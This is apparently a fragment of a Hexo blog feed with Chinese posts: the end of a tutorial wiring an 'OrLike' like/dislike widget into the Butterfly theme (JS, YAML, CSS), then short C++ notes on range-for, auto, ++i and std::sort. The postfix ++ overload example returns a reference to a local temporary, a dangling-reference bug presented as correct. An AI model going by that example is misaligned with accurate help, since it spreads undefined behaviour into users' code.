class="title function_">remove</span>(); $(obj.<span class="property">el</span>).<span class="title function_">removeClass</span>(<span class="string">&quot;orlike-loading&quot;</span>); $(obj.<span class="property">el</span>).<span class="title function_">html</span>(template); obj.<span class="title function_">ckusr</span>(obj); $(<span class="string">&#x27;a.likeit.orlike&#x27;</span>).<span class="title function_">click</span>(&#123; <span class="attr">obj</span>: obj &#125;, obj.<span class="property">like</span>); $(<span class="string">&#x27;a.dislikeit.orlike&#x27;</span>).<span class="title function_">click</span>(&#123; <span class="attr">obj</span>: obj &#125;, obj.<span class="property">dislike</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">OrLike</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">ckusr</span> = <span class="keyword">function</span> (<span class="params">obj</span>) &#123;</span><br><span class="line">    server_url = <span class="variable language_">this</span>.<span class="property">serverUrl</span>; $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;GET&#x27;</span>, <span class="attr">url</span>: server_url + <span class="string">&#x27;/ckusr&#x27;</span>, <span class="attr">dataType</span>: <span class="string">&#x27;jsonp&#x27;</span>, <span class="attr">jsonp</span>: <span class="string">&quot;callback&quot;</span>, <span class="attr">jsonpCallback</span>: <span class="string">&quot;success&quot;</span>, <span class="attr">xhrFields</span>: &#123; <span class="attr">withCredentials</span>: <span class="literal">true</span> &#125;, <span class="attr">async</span>: <span class="literal">false</span>, <span class="attr">crossDomain</span>: <span class="literal">true</span>, <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">stat</span> == <span class="string">&#x27;ok&#x27;</span> &amp;&amp; data.<span class="property">uid</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                obj.<span class="property">ckid</span> = data.<span class="property">ckid</span>; <span class="keyword">if</span> (!<span class="title function_">getCookie</span>(data.<span class="property">ckid</span>)) &#123; <span class="title function_">setCookie</span>(data.<span class="property">ckid</span>, data.<span class="property">uid</span>, obj.<span class="property">days</span>); &#125;</span><br><span class="line">                obj.<span class="title function_">query</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123; <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;connect orlike failed!!!&#x27;</span>); &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">OrLike</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">query</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    server_url = <span class="variable language_">this</span>.<span class="property">serverUrl</span>; $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;GET&#x27;</span>, <span class="attr">url</span>: server_url + <span class="string">&#x27;/qry?link=&#x27;</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">pathname</span>, <span class="attr">dataType</span>: <span class="string">&#x27;jsonp&#x27;</span>, <span class="attr">jsonp</span>: <span class="string">&quot;callback&quot;</span>, <span class="attr">jsonpCallback</span>: <span class="string">&quot;success&quot;</span>, <span class="attr">xhrFields</span>: &#123; <span class="attr">withCredentials</span>: <span class="literal">true</span> &#125;, <span class="attr">crossDomain</span>: <span class="literal">true</span>, <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">stat</span> == <span class="string">&#x27;ok&#x27;</span>) &#123; </span><br><span class="line">                $(<span class="string">&#x27;a.likeit.orlike i span&#x27;</span>).<span class="title function_">text</span>(data[<span class="string">&#x27;like&#x27;</span>]);</span><br><span class="line">                $(<span class="string">&#x27;span.post-meta-orlike a span&#x27;</span>).<span class="title function_">text</span>(data[<span class="string">&#x27;like&#x27;</span>]);</span><br><span class="line">                $(<span class="string">&#x27;a.dislikeit.orlike i span&#x27;</span>).<span class="title function_">text</span>(data[<span class="string">&#x27;dislike&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123; <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;query orlike failed!!!&#x27;</span>); &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">OrLike</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">orl</span> = <span class="keyword">function</span> (<span class="params">obj, method</span>) &#123; server_url = obj.<span class="property">serverUrl</span>; req_url = server_url + <span class="string">&#x27;/orl?method=&#x27;</span> + method + <span class="string">&#x27;&amp;link=&#x27;</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">pathname</span> + <span class="string">&#x27;&amp;&#x27;</span> + obj.<span class="property">ckid</span> + <span class="string">&#x27;=&#x27;</span> + <span class="title function_">getCookie</span>(obj.<span class="property">ckid</span>); $.<span class="title function_">ajax</span>(&#123; <span class="attr">type</span>: <span class="string">&#x27;GET&#x27;</span>, <span class="attr">url</span>: req_url, <span class="attr">dataType</span>: <span class="string">&#x27;jsonp&#x27;</span>, <span class="attr">jsonp</span>: <span class="string">&quot;callback&quot;</span>, <span class="attr">jsonpCallback</span>: <span class="string">&quot;success&quot;</span>, <span class="attr">xhrFields</span>: &#123; <span class="attr">withCredentials</span>: <span class="literal">true</span> &#125;, <span class="attr">crossDomain</span>: <span class="literal">true</span>, <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123; obj.<span class="title function_">query</span>(); &#125;, &#125;); &#125;</span><br><span class="line"><span class="title class_">OrLike</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">like</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123; obj = event.<span class="property">data</span>.<span class="property">obj</span>; obj.<span class="title function_">orl</span>(obj, <span class="string">&#x27;like&#x27;</span>); &#125;</span><br><span class="line"><span class="title class_">OrLike</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">dislike</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123; obj = event.<span class="property">data</span>.<span class="property">obj</span>; obj.<span class="title function_">orl</span>(obj, <span class="string">&#x27;dislike&#x27;</span>); &#125;</span><br></pre></td></tr></table></figure><p>打开主题配置文件<code>_config.butterfly.yml</code>，搜索<code>inject</code>引入<code>orlike.js</code>和<code>JQ</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer=&quot;true&quot;</span> <span class="string">src=&quot;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer=&quot;true&quot;</span> <span class="string">src=&quot;/js/orlike.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/05/09/p9B6cHx.png" alt=""></p><p>打开<code>Blog\source\css\custom.css</code>，缺少的文件夹或文件直接创建即可，在末尾写入下列代码并在主题配置文件<code>_config.butterfly.yml</code>引入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.orlike</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">26px</span><span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">text-shadow</span>: <span class="number">5px</span> <span class="number">5px</span> <span class="number">5px</span> <span class="number">#2ed0d9fc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=dark]</span></span><br><span class="line"><span class="selector-class">.orlike</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.85</span>);</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">4px</span> <span class="number">4px</span> <span class="number">4px</span> <span class="number">#23a8af99</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.orlike</span><span class="selector-pseudo">:first</span>-child&#123;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">36px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.orlike</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">0.3rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.orlike-box</span>&#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">15px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">flex-direction</span>: row;</span><br><span class="line">    <span class="attribute">flex-wrap</span>: nowrap;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">52px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.orlike</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#f07e7e</span><span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=dark]</span></span><br><span class="line"><span class="selector-class">.orlike</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#e87373e8</span><span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.orlike-loading</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">39px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">10px</span><span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid <span class="number">#acacac</span>;</span><br><span class="line">    <span class="attribute">border-bottom-color</span>: transparent;</span><br><span class="line">    -webkit-<span class="attribute">animation</span>: orlike-loadingRotate <span class="number">0.75s</span> linear infinite;</span><br><span class="line">    <span class="attribute">animation</span>: orlike-loadingRotate <span class="number">0.75s</span> linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-webkit-keyframes</span> orlike-loadingRotate &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">180deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">360deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> orlike-loadingRotate &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">180deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">360deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/custom.css&quot;</span> <span class="string">media=&quot;defer&quot;</span> <span class="string">onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/05/09/p9Bck5T.png" alt=""></p><h2 id="hexo三连"><a href="#hexo三连" class="headerlink" title="hexo三连"></a>hexo三连</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 插件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>for循环的新型遍历</title>
      <link href="/post/c87cbb52.html"/>
      <url>/post/c87cbb52.html</url>
      
        <content type="html"><![CDATA[<h4 id="c-遍历容器一般是这样的"><a href="#c-遍历容器一般是这样的" class="headerlink" title="c++遍历容器一般是这样的"></a>c++遍历容器一般是这样的</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;std::string&gt; name = &#123;<span class="string">&quot;ljy&quot;</span>, <span class="string">&quot;wy&quot;</span>, <span class="string">&quot;wz&quot;</span>, <span class="string">&quot;dqy&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = name.<span class="built_in">begin</span>(); i != name.<span class="built_in">end</span>(); i++)<span class="comment">// 这里auto替换了std::vector&lt;std::string&gt;::iterator</span></span><br><span class="line">    std::cout &lt;&lt; *i &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><h4 id="在c-11中我们可以简化成这样"><a href="#在c-11中我们可以简化成这样" class="headerlink" title="在c++11中我们可以简化成这样"></a>在c++11中我们可以简化成这样</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;std::string&gt; name = &#123;<span class="string">&quot;ljy&quot;</span>, <span class="string">&quot;wy&quot;</span>, <span class="string">&quot;wz&quot;</span>, <span class="string">&quot;dqy&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i : name)<span class="comment">// 注意，这里auto替换的是std::string，即直接将容器中的每个元素赋给了i进行遍历</span></span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>不懂auto用法的小伙伴可以参考：<a href="https://www.dqywy.top/post/77858f66.html">auto用法</a></p><h4 id="另外，也可以使用std-for-each实现相同功能，注意要添加头文件"><a href="#另外，也可以使用std-for-each实现相同功能，注意要添加头文件" class="headerlink" title="另外，也可以使用std::for_each实现相同功能，注意要添加头文件"></a>另外，也可以使用std::for_each实现相同功能，注意要添加<algorithm>头文件</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义操作，挨个传入容器元素</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output</span><span class="params">(std::string s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; s &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::vector&lt;std::string&gt; name = &#123; <span class="string">&quot;ljy&quot;</span>, <span class="string">&quot;wy&quot;</span>, <span class="string">&quot;wz&quot;</span>, <span class="string">&quot;dqy&quot;</span> &#125;;</span><br><span class="line">std::for_each(name.<span class="built_in">begin</span>(), name.<span class="built_in">end</span>(), output);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 实用语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++实用语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>auto用法</title>
      <link href="/post/77858f66.html"/>
      <url>/post/77858f66.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>auto会根据赋给变量的初值自动填充变量类型，当变量类型很长的时候尤其好用</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>（1）使用auto必须要赋初值，且初值不能是模板或函数等不确定类型，因为需要根据初值判断变量类型</p><p>（2）使用auto同时定义几个变量要求这几个变量的初值类型相同</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> a = <span class="number">3</span>, b = <span class="string">&#x27;3&#x27;</span>, c = <span class="string">&quot;3&quot;</span>;<span class="comment">// 这样不行，初值类型不同只能分开写</span></span><br></pre></td></tr></table></figure><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;std::string&gt; name = &#123;<span class="string">&quot;ljy&quot;</span>, <span class="string">&quot;wy&quot;</span>, <span class="string">&quot;wz&quot;</span>, <span class="string">&quot;dqy&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = name.<span class="built_in">begin</span>(); i != name.<span class="built_in">end</span>(); i++)<span class="comment">// 这里auto替换了std::vector&lt;std::string&gt;::iterator</span></span><br><span class="line">    std::cout &lt;&lt; *i &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><h3 id="上述循环根据c-11标准也可以这样写"><a href="#上述循环根据c-11标准也可以这样写" class="headerlink" title="上述循环根据c++11标准也可以这样写"></a>上述循环根据c++11标准也可以这样写</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;std::string&gt; name = &#123;<span class="string">&quot;ljy&quot;</span>, <span class="string">&quot;wy&quot;</span>, <span class="string">&quot;wz&quot;</span>, <span class="string">&quot;dqy&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i : name)<span class="comment">// 注意，这里auto替换的是std::string，即直接将容器中的每个元素赋给了i进行遍历</span></span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>今天第一次看到这样的用法，觉得非常方便^_^</p>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 实用语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++实用语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么推荐用++i</title>
      <link href="/post/415de4d5.html"/>
      <url>/post/415de4d5.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br></pre></td></tr></table></figure><p>以前看别人这么写都不太在意，今天偶然瞥到有说<code>++i</code>比<code>i++</code>效率更高</p><h2 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h2><p>于是我去找了一下两种运算重载方法：</p><h3 id="（1）i"><a href="#（1）i" class="headerlink" title="（1）i++"></a>（1）i++</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//后置++运算符重载</span></span><br><span class="line">Num&amp; <span class="keyword">operator</span> ++(<span class="type">int</span> n)<span class="comment">// int n是为了与重载前置++区分开</span></span><br><span class="line">&#123;</span><br><span class="line">        Num temp = *<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;num++;</span><br><span class="line">        <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-i"><a href="#2-i" class="headerlink" title="(2) ++i"></a>(2) ++i</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//前置++运算符重载</span></span><br><span class="line">test&amp; <span class="keyword">operator</span> ++()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;num++;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比可以发现，<code>++i</code>比<code>i++</code>省略了一步储存原变量的过程</p>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 实用语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++实用语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++ sort函数</title>
      <link href="/post/3216d44c.html"/>
      <url>/post/3216d44c.html</url>
      
        <content type="html"><![CDATA[<p>今天get到了一点sort自定义排序函数的用法 </p><h2 id="sort函数的优势"><a href="#sort函数的优势" class="headerlink" title="sort函数的优势"></a>sort函数的优势</h2><p>STL中的sort()并非只是普通的快速排序，除了对普通的快速排序进行优化，它还结合了插入排序和堆排序。根据不同的数量级别以及不同情况，能自动选用合适的排序方法。当数据量较大时采用快速排序，分段递归。一旦分段后的数据量小于某个阀值，为避免递归调用带来过大的额外负荷，便会改用插入排序。而如果递归层次过深，有出现最坏情况的倾向，还会改用堆排序，是一个非常灵活方便的函数~</p><h2 id="sort函数的使用"><a href="#sort函数的使用" class="headerlink" title="sort函数的使用"></a>sort函数的使用</h2><h3 id="（1）头文件："><a href="#（1）头文件：" class="headerlink" title="（1）头文件："></a>（1）头文件：</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="（2）参数："><a href="#（2）参数：" class="headerlink" title="（2）参数："></a>（2）参数：</h3><p>sort函数一共有三个参数：sort(begin, end, cmp)</p><p>​    <1> begin为指向待排序的结构的第一个元素的指针</p><p>​    <2> end为指向待排序的结构的最后一个元素的<strong>下一个位置</strong>的指针</p><p>​    <3> cmp参数为排序准则，cmp参数可以不写，如果不写的话，默认从小到大进行排序</p><h3 id="（3）自定义排序准则"><a href="#（3）自定义排序准则" class="headerlink" title="（3）自定义排序准则"></a>（3）自定义排序准则</h3><p>​    <1> 对类排序:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">string name;<span class="comment">// 学生姓名</span></span><br><span class="line"><span class="type">int</span> grade;<span class="comment">// 学生成绩</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将你希望情况作为返回</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp_grade</span><span class="params">(Pair x, Pair y)</span><span class="comment">// x为前一项数据，y为后一项数据</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x.grade &gt; y.grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sort</span>(pair, pair + n, cmp_grade);<span class="comment">// n为学生人数</span></span><br></pre></td></tr></table></figure><p>​    <2> 对一般数据类型从大到小排序</p><p>注意：这里的greater是函数，要加()</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> num1[<span class="number">3</span>] = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line"><span class="built_in">sort</span>(num1, num1 + <span class="number">3</span>, <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line"></span><br><span class="line"><span class="type">float</span> num2[<span class="number">3</span>] = &#123;<span class="number">3.1</span>, <span class="number">1.2</span>, <span class="number">2.3</span>&#125;;</span><br><span class="line"><span class="built_in">sort</span>(num2, num2 + <span class="number">3</span>, <span class="built_in">greater</span>&lt;<span class="type">float</span>&gt;());</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> num3[<span class="number">3</span>] = &#123;<span class="number">3.1125</span>, <span class="number">1.2332</span>, <span class="number">2.3556</span>&#125;;</span><br><span class="line"><span class="built_in">sort</span>(num3, num3 + <span class="number">3</span>, <span class="built_in">greater</span>&lt;<span class="type">double</span>&gt;());</span><br></pre></td></tr></table></figure><h3 id="还有别的用法欢迎在评论区补充"><a href="#还有别的用法欢迎在评论区补充" class="headerlink" title="还有别的用法欢迎在评论区补充~"></a>还有别的用法欢迎在评论区补充~</h3>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 实用函数 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++实用函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字排序</title>
      <link href="/post/84cbdd88.html"/>
      <url>/post/84cbdd88.html</url>
      
